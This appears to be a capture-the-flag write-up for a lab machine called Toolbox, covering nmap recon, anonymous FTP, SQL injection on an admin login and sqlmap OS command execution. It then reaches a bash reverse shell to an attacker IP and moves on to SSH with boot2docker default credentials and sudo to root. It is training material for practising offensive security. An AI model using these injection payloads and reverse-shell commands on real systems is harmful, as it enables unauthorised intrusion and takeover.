# üîé Intell/Recon

## Intellingence Gathering üïµüèæ

Here we kick off our **nmap** scan in order to see which technology is being run on the server

Here is the results of our different scans

First we look for open ports

`nmap -p- -vv --min-rate 5000 --reason -oN ./Nmap/initial.log 10.10.10.236`

<figure><img src="/Assets/Pictures/Toolbox/image (4).png" alt="image proof"><figcaption><p><em>Open ports</em></p></figcaption></figure>

We can now check the service Version in order to gatherr more information

`nmap -sV -p- -vv --min-rate 5000 -oN ./services-scripts.log 10.10.10.236`

## Enumeration

### FTP

Let's start with the low hanging fruit as _@thecybermentor_ always thought us. For this system here. It make sense to start with FTP on port 21. \
We do not have credentials so we will get it with the anonymous login

This file is too heavy, for me to download. I will keep that in mind that the system has a docker-toolbox.exe file. Which suggest that the system must have docker installed in it. There is sadly nothing more to see here

### HTTPS

Now let's visit the webpage at `https://10.10.10.236/`

<figure><img src="/Assets/Pictures/Toolbox/image (12).png" alt="image proof"><figcaption><p><em>the Website</em></p></figcaption></figure>

As we can see it's more of a static webpage. I checked the source code and ran some directory busting but nothing really juicy is coming out. Then I needed to check for the presence of Virtual Hosts (VHOST) on the target. The are two ways to do it. First, I check with the scripts of nmap cause it leaks sometimes. I did not need to run any directory busting to find the vhost it was there while getting the nmap script

`nmap -sVC -p443 -vv -T5 -oN services-HTTPS.log 10.10.10.236`

<figure><img src="/Assets/Pictures/Toolbox/image.png" alt="image proof"><figcaption><p><em>Nmap service Version &#x26; Scripts</em></p></figcaption></figure>

We found our VHOST which is _**admin.megalogistic.com**_** ** and we also found a username which is _'admin'_

# üë£ Foothold

We have the admin subdomain and we know the username to access the admin panel.

for that let's add the new subdomain to our hosts file with the following:&#x20;

`echo "10.10.10.236    admin.megalogistics.com" | sudo tee -a /etc/hosts`

<figure><img src="/Assets/Pictures/Toolbox/image (10).png" alt="image proof"><figcaption><p><em>login panel of admin.megalogistic.com</em></p></figcaption></figure>

I tried the usual admin:admin but no success. Since it's login form next thing would be to fire burp and see what's going on. But before that, let's try some SQL injection payloads to see what's going on here. I tried with the login = admin' or 1=1. There was an interesting error message suggesting that we have an sqlinjection vulnerability here.

Here is the error message, I got&#x20;

<figure><img src="/Assets/Pictures/Toolbox/image (13).png" alt="image proof"><figcaption><p><em>Error from login Panel</em></p></figcaption></figure>

From the error we can literally see the SQL query that helps the user to log in. So from Burpsuite, we will get the POST request and use SQLMap in order to exploit this vulnerability

# üìö SQLMap

The command was simple. I had to copy the POST request from Burpsuite into a file and then use it to test and see what we can get. I tried first to run a system command in order to see that it's vulnerable\
`sqlmap -r request.txt --batch --force-ssl  --os-cmd whoami`` `_``_&#x20;

<figure><img src="/Assets/Pictures/Toolbox/image (6).png" alt="image proof"><figcaption><p><em>SQLMap results</em></p></figcaption></figure>

Since we are able to see the user on the system, we can get a reverse shell as well.

With the following:

`sqlmap -r request.txt --batch --force-ssl   --os-shell`

<figure><img src="/Assets/Pictures/Toolbox/image (7).png" alt="image proof"><figcaption><p><em>SQLMap os-shell</em></p></figcaption></figure>

The next thing that needs to be done is to get a stable reverse-shell since this one can not be used for enumeration. In order to do so we will need to have our listener set with _nc -nvlp 9090_ on our terminal and the following to get our rever-shell.&#x20;

`bash -c "bash -i >& /dev/tcp/[YOUR-IP]/9090 0>&1"`

# üè¥‚ò† User Flag

Since the user in the system is _postgres_ we need to navigate to that directory in order to get the flag

<figure><img src="/Assets/Pictures/Toolbox/image (11).png" alt="image proof"><figcaption><p><em>User flag</em></p></figcaption></figure>

After getting the, I spent time enumerating the box. Found the real I.P and the hostname. Which is not similar to the one we are going after. We are suppose to be attacking a windows machine but seems like we need to pivot to the target

<figure><img src="/Assets/Pictures/Toolbox/image(14).png" alt="image proof"><figcaption><p><em>System Enumeration</em></p></figcaption></figure>

After the enumeration and looking at the info i gathered. I remember I have found a docker file in the FTP server. After checking on the documentation, I can ssh to the docker

# üèÅ Privesc

Now that we know we can ssh to the docker container. I could not find any credentials on the system. A little search lead me to this [Github Page](https://github.com/boot2docker/boot2docker#ssh-into-vm). In order to understand more on what is happening and see what are the default credentials. __&#x20;

using ssh, I was able to get the docker instance.

_`ssh docker@172.17.0.1`_

_We used 172.17.0.1 since the other box where we got our foothold had an address of 172.17.0.2 which in turn suggest that the docker machine should be at 172.17.0.1_

<figure><img src="/Assets/Pictures/Toolbox/image (5).png" alt="image proof"><figcaption><p><em>Boom ! docker admin user</em></p></figcaption></figure>

Now that we are in the container, we can run some commands to see how to privesc. In order to do that we will need to run some OS commands in order to enumerate the system. turns out,&#x20;

_`sudo -l`_ was enough for us, and running _`sudo su`_ gives the root shell

<figure><img src="/Assets/Pictures/Toolbox/image (9).png" alt="image proof"><figcaption><p><em>Windows File System</em></p></figcaption></figure>

Keep in mind it's a windows machine so the path should be same as the traditional. Which is

_C:\Users\Administrator\\_ the flag should be sitting somewhere in the admin directory.\
